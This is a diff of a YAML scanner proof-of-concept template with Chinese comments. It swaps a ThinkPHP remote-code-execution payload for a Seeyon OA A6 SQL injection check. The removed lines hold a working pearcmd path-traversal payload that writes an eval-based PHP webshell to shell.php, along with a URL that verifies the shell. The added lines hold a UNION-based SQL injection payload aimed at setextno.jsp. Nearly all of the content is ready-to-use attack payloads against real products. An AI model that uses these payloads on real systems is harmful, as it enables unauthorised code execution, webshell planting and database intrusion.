@@ -1,18 +1,18 @@
 #poc名称
 - name:
-  - name: "thinkphp_rce"
+  - name: "SeeyouOA_A6_setextno_SQL_injection"
 
 #请求方式
 - method:
-  - method: "post"
+  - method: "get"
 
 #漏洞的位置
 - url:
-  - url : "/public/index.php"
+  - url : "/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp"
 
 #payload
 - payload:
-  - payload: "lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_REQUEST['cmd']);?>+/var/www/html/shell.php"
+  - payload: "user_ids=(99999)+union+all+select+1,2,(md5(1)),4#"
 
 #response包里状态码
 - status:
@@ -21,17 +21,16 @@
 #response包里的关键字
 - word:
   - word:
-      - "php_dir"
+      - "c4ca4238a0b923820dcc509a6f75849b"
 
 #验证是否攻击成功的 请求方式
 - method-V:
-  - method: "get"
+  - method: "isNone"
 
 #webshell位置
 - verify:
-  - verify : "/shell.php?cmd=phpinfo();"
+  - verify : "isNone"
 
 #cmd 为了适配Java反序列化漏洞
 - cmd:
   - cmd : "isNone"
-
